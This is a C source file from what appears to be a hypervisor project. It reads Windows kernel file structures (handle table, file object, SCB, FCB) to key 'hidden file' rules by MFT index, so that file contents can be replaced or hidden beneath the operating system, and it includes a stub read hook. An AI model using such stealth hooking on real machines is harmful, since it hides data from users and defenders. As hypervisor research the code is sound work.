#include <vmx_modules/hooking_module.h>
#include <vmx_modules/kpp_module.h>
#include <vmm/msr.h>
#include <debug.h>
#include <win_kernel/memory_manager.h>
#include <intrinsics.h>
#include <vmm/vm_operations.h>
#include <vmm/vmcs.h>
#include <win_kernel/syscall_handlers.h>
#include <vmm/memory_manager.h>
#include <vmm/vmm.h>
#include <win_kernel/kernel_objects.h>
#include <win_kernel/file.h>

QWORD_MAP g_filesData;

VOID FileInit()
{
    MapCreate(&g_filesData, BasicHashFunction, BASIC_HASH_LEN, DefaultEqualityFunction);
}

STATUS FileTranslateScbToFcb(IN QWORD scb, OUT QWORD_PTR fcb)
{
    STATUS status;
    
    if((status = WinMmCopyGuestMemory(fcb, scb + SCB_FCB_OFFSET, sizeof(QWORD))) != STATUS_SUCCESS)
    {
        Print("Could not copy FCB address\n");
        return status;
    }
    return STATUS_SUCCESS;
}

STATUS FileGetFcbField(IN QWORD fcb, IN QWORD field, OUT PVOID value)
{
    switch(field)
    {
        case FCB_MFT_INDEX:
            return WinMmCopyGuestMemory(value, fcb + field, sizeof(QWORD));
        default:
            Print("Could not find the specified field\n");
            ASSERT(FALSE);
    }
}

STATUS FileAddNewProtectedFile(IN HANDLE fileHandle, IN BYTE_PTR content, IN QWORD contentLength, 
    IN BYTE encodingType)
{
    PSHARED_CPU_DATA shared;
    PHEAP heap;
    PHOOKING_MODULE_EXTENSION ext;
    PHIDDEN_FILE_RULE rule;
    QWORD fileObject, scb, fcb, eprocess, handleTable, fileIndex;
    STATUS status;

    shared = VmmGetVmmStruct()->currentCPU->sharedData;
    heap = &shared->heap;
    // Translate the Handle to an object
    ObjGetCurrent_EPROCESS(&eprocess);
    ObjGetObjectField(EPROCESS, eprocess, EPROCESS_OBJECT_TABLE, &handleTable);
    if((status = ObjTranslateHandleToObject(fileHandle, handleTable, &fileObject)) 
        != STATUS_SUCCESS)
    {
        Print("Failed to translate handle to object\n");
        return status;   
    }
    // Get the MFTIndex field
    if((status = ObjGetObjectField(FILE_OBJECT, fileObject, FILE_OBJECT_SCB, &scb)) 
        != STATUS_SUCCESS)
    {
        Print("Failed to get SCB from file object\n");
        return status;   
    }
    if((status = FileTranslateScbToFcb(scb, &fcb)) != STATUS_SUCCESS)
    {
        Print("Failed to get FCB from FCB\n");
        return status; 
    }
    if((status = FileGetFcbField(fcb, FCB_MFT_INDEX, &fileIndex)) != STATUS_SUCCESS)
    {
        Print("Failed to get MFTIndex\n");
        return status;
    }
    // Allocate memory for storing the rule
    heap->allocate(heap, sizeof(HIDDEN_FILE_RULE), &rule);
    heap->allocate(heap, contentLength, &rule->content.data);
    HwCopyMemory(rule->content.data, content, contentLength);
    // Set the rule
    rule->content.length = contentLength;
    rule->rule = FILE_HIDE_CONTENT;
    rule->encoding = encodingType;
    // Get the module extension
    // Map the file to a rule
    MapSet(&g_filesData, fileIndex, rule);
    Print("File rule added for file idx: %8, data: %.b\n", fileIndex, contentLength, content);
    return STATUS_SUCCESS;
}

STATUS FileRemoveProtectedFile(IN HANDLE fileHandle)
{
    PSHARED_CPU_DATA shared;
    PHEAP heap;
    PHOOKING_MODULE_EXTENSION ext;
    PHIDDEN_FILE_RULE rule;
    QWORD eprocess, handleTable, fileObject, scb, fcb, fileIndex;
    STATUS status;

    shared = VmmGetVmmStruct()->currentCPU->sharedData;
    heap = &shared->heap;
    ObjGetCurrent_EPROCESS(&eprocess);
    ObjGetObjectField(EPROCESS, eprocess, EPROCESS_OBJECT_TABLE, &handleTable);
    if((status = ObjTranslateHandleToObject(fileHandle, handleTable, &fileObject)) 
        != STATUS_SUCCESS)
    {
        Print("Failed to translate handle to object\n");
        return status;   
    }
    // Get the MFTIndex field
    if((status = ObjGetObjectField(FILE_OBJECT, fileObject, FILE_OBJECT_SCB, &scb)) 
        != STATUS_SUCCESS)
    {
        Print("Failed to get SCB from file object\n");
        return status;   
    }
    if((status = FileTranslateScbToFcb(scb, &fcb)) != STATUS_SUCCESS)
    {
        Print("Failed to get FCB from FCB\n");
        return status; 
    }
    if((status = FileGetFcbField(fcb, FCB_MFT_INDEX, &fileIndex)) != STATUS_SUCCESS)
    {
        Print("Failed to get MFTIndex\n");
        return status;
    }
    rule = (PHIDDEN_FILE_RULE)MapRemove(&g_filesData, fileIndex);
    if(rule != MAP_KEY_NOT_FOUND)
    {
        // Free the stored data
        heap->deallocate(heap, rule->content.data);
        if(rule->optional.data)
            heap->deallocate(heap, rule->optional.data);
        heap->deallocate(heap, rule);
    }
    return STATUS_SUCCESS;
}

STATUS FileGetRuleByIndex(IN QWORD fileIndex, OUT PHIDDEN_FILE_RULE* rule)
{
    return ((*rule = MapGet(&g_filesData, fileIndex)) != MAP_KEY_NOT_FOUND) ?
         STATUS_SUCCESS : STATUS_FILE_NOT_FOUND;
}

STATUS FileHandleRead(IN PHOOK_CONTEXT context)
{
    PCURRENT_GUEST_STATE currentData;
    PSHARED_CPU_DATA shared;
    PREGISTERS regs;
    STATUS status;

    currentData = VmmGetVmmStruct();
    shared = currentData->currentCPU;
    regs = &currentData->guestRegisters;

    // mov qword ptr [rsp+10h],rdx
    SUCCESS_OR_RETURN(WinMmCopyMemoryToGuest(regs->rsp + 0x10, &regs->rdx, sizeof(QWORD)));
    regs->rip += context->relatedConfig->instructionLength;
    return STATUS_SUCCESS;
}

STATUS FileHandleReadReturn(IN PHOOK_CONTEXT context)
{
    return STATUS_SUCCESS;
}